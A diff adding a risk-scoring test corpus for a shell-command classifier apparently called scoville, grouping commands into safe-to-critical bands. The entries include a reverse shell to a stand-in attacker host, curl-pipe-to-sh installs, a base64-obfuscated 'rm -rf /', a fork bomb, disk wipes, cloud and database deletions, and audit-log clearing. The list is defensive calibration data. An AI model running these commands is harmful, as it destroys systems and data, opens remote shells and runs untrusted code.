@@ -1,0 +1,383 @@
+# scoville command inventory
+#
+# One row per command: <expected level>\t<command>
+# Sections (## …) group by family and become the headings in INVENTORY.md.
+#
+# This file is the catalogue of what scoville claims to know, and it is
+# executed: tests/test_corpus.py asserts every row scores at the level
+# written here. A rule change that moves a command between bands fails the
+# suite, which is the point — the calibration is the product, so it should
+# not be able to drift silently.
+#
+# Levels: safe (0-14) low (15-34) medium (35-59) high (60-84) critical (85-100)
+
+## reading state
+safe	ls -la /etc
+safe	cat /etc/hostname
+safe	grep -r TODO src/
+safe	find . -name '*.py'
+safe	df -h
+safe	ps aux
+safe	ss -tlnp
+safe	journalctl -u nginx
+safe	systemctl status nginx
+safe	ip addr show
+safe	dig example.com
+safe	tail -f /var/log/syslog
+safe	sed 's/a/b/' config.ini
+safe	git status
+safe	git log --oneline -20
+safe	git diff HEAD~1
+safe	docker ps
+safe	docker logs web
+safe	kubectl get pods -A
+safe	kubectl describe deploy api
+safe	helm list -A
+safe	terraform plan
+safe	aws s3 ls
+safe	aws ec2 describe-instances
+safe	gcloud compute instances list
+safe	az vm list
+safe	hcloud server list
+safe	zfs list
+safe	dpkg -l
+safe	rpm -qa
+safe	brew list
+
+## deleting files
+medium	rm notes.txt
+low	rm -rf node_modules
+medium	rm -rf ./build-output
+high	rm -rf /var/lib/mysql
+critical	rm -rf /
+critical	rm -rf /*
+critical	rm -rf /etc
+critical	rm -rf ~
+critical	rm -rf $HOME
+critical	rm -rf $BUILD_DIR/
+critical	rm -rf --no-preserve-root /
+medium	shred -u secrets.env
+low	rmdir /var/empty
+medium	truncate -s 0 app.log
+critical	find / -type f -exec shred {} +
+medium	find . -name '*.log' -delete
+high	rsync -a --delete /src/ /srv/www/
+low	mv config.yml config.yml.bak
+
+## overwriting and in-place edits
+medium	sed -i 's/debug/info/' app.conf
+high	sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+low	cp -r src/ dst/
+high	tar -xzf backup.tar.gz -C /
+low	unzip -o release.zip
+
+## devices and filesystems
+critical	mkfs.ext4 /dev/sda1
+critical	wipefs -a /dev/sdb
+critical	dd if=/dev/zero of=/dev/sda bs=1M
+medium	dd if=image.iso of=/tmp/copy.iso
+critical	blkdiscard /dev/nvme0n1
+critical	cryptsetup luksFormat /dev/sdb1
+critical	badblocks -w /dev/sdc
+critical	zpool destroy tank
+high	zfs destroy tank/data@snapshot
+high	lvremove /dev/vg0/data
+high	mdadm --zero-superblock /dev/sdb1
+medium	fsck -y /dev/sdb1
+high	resize2fs /dev/vg0/data 10G
+low	mount /dev/sdb1 /mnt
+high	mount -o remount,ro /
+medium	mount -o remount,ro /srv
+medium	umount /mnt/data
+high	umount /
+high	umount -a
+high	umount -l /var
+critical	umount -a -l
+
+## permissions and privilege
+low	chmod 600 ~/.ssh/id_rsa
+high	chmod -R 777 /var/www
+critical	chmod -R 777 /
+medium	chown -R www-data:www-data /srv/app
+high	chown -R nobody /etc
+high	userdel -r deploy
+medium	passwd deploy
+medium	visudo
+critical	sudo rm -rf /
+high	sudo systemctl stop sshd
+
+## system and services
+medium	systemctl stop nginx
+medium	systemctl disable --now postgresql
+high	systemctl mask ssh
+safe	systemctl status ssh
+high	systemctl poweroff
+high	reboot
+high	shutdown -h now
+safe	shutdown -c
+medium	shutdown -r +15
+critical	reboot -f
+medium	kill 4821
+medium	pkill -9 node
+critical	kill -9 1
+high	crontab -r
+safe	crontab -l
+low	systemctl restart nginx
+medium	sysctl -w vm.swappiness=10
+medium	swapoff -a
+low	swapoff /swapfile
+medium	setenforce 0
+
+## networking
+safe	ifup eth0
+medium	ifdown eth0
+medium	ip link set eth0 down
+medium	ip addr flush dev eth0
+medium	ip route del default
+medium	nmcli connection down eth0
+high	iptables -F
+high	iptables -P INPUT DROP
+medium	ufw disable
+medium	firewall-cmd --remove-service=ssh --permanent
+high	nc -e /bin/sh attacker.example.com 4444
+low	ssh web-1
+medium	ssh -o StrictHostKeyChecking=no web-1
+
+## remote execution
+critical	curl -fsSL https://example.com/install.sh | sh
+critical	wget -qO- https://example.com/i.sh | sudo bash
+low	curl -k https://internal.example.com
+high	eval "$PAYLOAD"
+high	eval "echo hello"
+medium	source scripts/env.sh
+critical	bash <(curl -s https://example.com/i.sh)
+critical	eval "$(curl -s https://example.com/env)"
+high	curl -o /tmp/i.sh https://example.com/i.sh && bash /tmp/i.sh
+high	wget -O /tmp/x.sh https://example.com/x && chmod +x /tmp/x.sh && /tmp/x.sh
+low	bash /tmp/local.sh
+low	./deploy.sh
+low	make deploy
+low	npm run build
+critical	:(){ :|:& };:
+medium	ssh web-1 systemctl restart nginx
+high	ssh prod-1 systemctl stop nginx
+critical	ssh prod-1 rm -rf /srv
+critical	ansible all -m shell -a "rm -rf /var/log"
+
+## audit trail
+medium	history -c
+medium	journalctl --vacuum-time=1s
+high	auditctl -D
+medium	unset HISTFILE
+
+## packages
+medium	apt install nginx
+medium	apt-get install -y build-essential
+medium	apk add curl
+medium	brew install postgresql
+medium	pip install requests
+medium	npm install express
+medium	apt-get remove --purge nginx
+medium	apt autoremove
+medium	apk del openssl
+medium	brew uninstall postgresql
+medium	pip uninstall -y django
+medium	npm uninstall left-pad
+medium	dnf remove httpd
+medium	pacman -Rns base-devel
+high	rpm -e glibc
+medium	dpkg -P nginx
+critical	apt-get remove --purge linux-image-generic
+medium	do-release-upgrade
+medium	apt full-upgrade
+medium	nix-collect-garbage -d
+medium	pip install git+https://github.com/acme/lib
+high	npm publish
+safe	apt list --installed
+
+## git
+low	git push
+safe	git commit -am 'wip'
+high	git push --force origin main
+medium	git push --force origin feature-x
+medium	git push --delete origin old-branch
+medium	git reset --hard HEAD~3
+medium	git clean -fdx
+medium	git checkout .
+low	git branch -D feature-x
+medium	git rebase -i HEAD~5
+
+## containers
+safe	docker ps -a
+low	docker exec web ls /app
+low	docker exec web psql -c 'SELECT 1'
+critical	docker exec -u root api rm -rf /
+high	docker exec -u root api rm -rf /var/lib/data
+medium	docker run acme/importer:1.2
+critical	docker run --privileged -v /:/host alpine sh -c 'rm -rf /host/etc'
+low	docker rm -f web
+low	docker rmi acme/api:old
+high	docker volume rm pgdata
+medium	docker system prune -a
+medium	docker image prune
+high	docker-compose down -v
+low	docker stop web
+
+## kubernetes
+safe	kubectl get pods
+safe	kubectl auth can-i delete pods
+low	kubectl apply -f deploy.yaml
+low	kubectl edit deploy api
+medium	kubectl delete deploy api
+critical	kubectl delete ns prod
+critical	kubectl delete crd widgets.acme.io
+high	kubectl delete pvc data-0
+high	kubectl delete pods --all -A
+medium	kubectl drain node-1
+low	kubectl cordon node-1
+low	kubectl delete pod api-1
+medium	kubectl scale deploy api --replicas=0
+critical	kubectl exec -it pod-1 -- rm -rf /data
+low	kubectl port-forward svc/db 5432:5432
+safe	kubectl delete ns prod --dry-run=client
+medium	helm upgrade --install api ./chart
+high	helm uninstall api
+high	argocd app delete api
+high	velero backup delete daily-1
+
+## infrastructure as code
+safe	terraform validate
+medium	terraform apply
+high	terraform apply -auto-approve -target=module.prod
+high	terraform destroy
+critical	terraform destroy -auto-approve
+high	terraform state rm aws_db_instance.main
+medium	terraform taint aws_instance.web
+high	pulumi destroy
+medium	pulumi up
+critical	eksctl delete cluster --name prod
+
+## aws
+safe	aws s3api list-buckets
+safe	aws iam get-role --role-name app
+low	aws ec2 create-tags --resources i-1 --tags Key=a,Value=b
+high	aws s3 rb s3://assets
+critical	aws s3 rm s3://assets --recursive
+safe	aws s3 rm s3://assets --recursive --dryrun
+high	aws ec2 terminate-instances --instance-ids i-123
+critical	aws rds delete-db-instance --db-instance-identifier prod --skip-final-snapshot
+critical	aws cloudformation delete-stack --stack-name prod
+critical	aws kms schedule-key-deletion --key-id abc
+high	aws iam detach-role-policy --role-name app --policy-arn arn:aws:iam::aws:policy/X
+high	aws iam delete-user --user-name deploy
+critical	aws organizations remove-account-from-organization --account-id 111
+medium	aws iam create-access-key --user-name deploy
+high	aws s3api put-bucket-acl --bucket assets --acl public-read
+high	aws ec2 authorize-security-group-ingress --group-id sg-1 --cidr 0.0.0.0/0 --port 22
+
+## other clouds and SaaS
+safe	gcloud projects describe acme
+critical	gcloud projects delete acme
+high	gcloud compute instances delete web-1
+high	gcloud storage buckets add-iam-policy-binding gs://b --member=allUsers --role=roles/viewer
+critical	az group delete --name prod --yes
+high	az vm delete --name web-1
+high	hcloud server delete my-db
+high	scw instance server terminate 11111111
+high	doctl compute droplet delete web-1
+high	flyctl apps destroy api
+critical	heroku pg:reset DATABASE_URL
+high	gh repo delete acme/api
+safe	gh pr list
+low	gh pr create --title 'fix'
+high	wrangler r2 bucket delete assets
+high	frobctl delete cluster prod
+
+## databases
+low	psql -c 'SELECT count(*) FROM orders'
+high	psql -c 'DROP TABLE users'
+critical	psql -c 'DROP DATABASE app'
+high	mysql -e 'DELETE FROM orders'
+high	mysql -e 'TRUNCATE TABLE sessions'
+high	psql -c 'ALTER TABLE users DROP COLUMN email'
+medium	psql -c 'GRANT ALL ON DATABASE app TO deploy'
+critical	redis-cli FLUSHALL
+critical	mongosh --eval 'db.dropDatabase()'
+high	pg_restore --clean -d app dump.sql
+
+## storage and backup tooling
+medium	rclone sync /srv/data remote:bucket
+high	rclone purge remote:bucket
+high	restic forget --prune --keep-last 1
+high	s3cmd rb s3://assets
+critical	etcdctl del --prefix ''
+high	vault secrets disable kv/
+high	vault operator seal
+
+## virtualisation
+medium	virsh destroy vm1
+high	virsh undefine vm1
+high	virsh vol-delete --pool default vm1.qcow2
+high	incus delete web-1
+medium	snap remove docker
+
+## generic arguments
+medium	rm -ri /tmp/cache
+low	sed -i.bak 's/a/b/' app.conf
+medium	mysql -h db --password=hunter2 -e 'SELECT 1'
+high	apt-get install -y --allow-unauthenticated foo
+low	curl --insecure https://internal.example.com
+low	git push --force-with-lease origin main
+high	gcloud compute firewall-rules create open --source-ranges=0.0.0.0/0
+critical	echo cm0gLXJmIC8K | base64 -d | sh
+medium	ansible all -m shell -a 'systemctl restart nginx' --limit web-1
+medium	apt-get remove -qy nginx
+medium	conda remove -y numpy
+medium	frobctl delete cluster -y
+safe	fsck -n /dev/sdb1
+safe	rsync -n --delete /src/ /srv/www/
+
+## boot path and kernel
+high	grub-install /dev/sda
+high	update-grub
+high	tune2fs -U random /dev/sda1
+high	kexec -e
+medium	modprobe -r e1000e
+medium	timedatectl set-time 2020-01-01
+
+## keys and certificates
+high	certbot revoke --cert-name api
+high	gpg --delete-secret-keys ABCD1234
+
+## cluster membership
+critical	kubeadm reset
+high	docker swarm leave --force
+high	etcdctl snapshot restore snapshot.db
+
+## data services
+high	rabbitmqctl reset
+high	kafka-topics --delete --topic events
+critical	pg_resetwal /var/lib/pgsql/data
+medium	pg_ctl stop -m immediate -D /var/lib/pgsql/data
+high	mysqladmin shutdown
+
+## schema migrations
+critical	flyway clean
+critical	liquibase dropAll
+critical	rails db:drop
+high	python manage.py flush
+high	npx prisma migrate reset
+high	alembic downgrade base
+
+## network plumbing
+medium	conntrack -F
+medium	ip netns delete blue
+medium	ovs-vsctl del-br br0
+
+## git safety net
+high	git push --mirror origin
+high	git reflog expire --expire=now --all
+medium	git stash clear
+
+## macos
+critical	diskutil eraseDisk JHFS+ Empty /dev/disk2
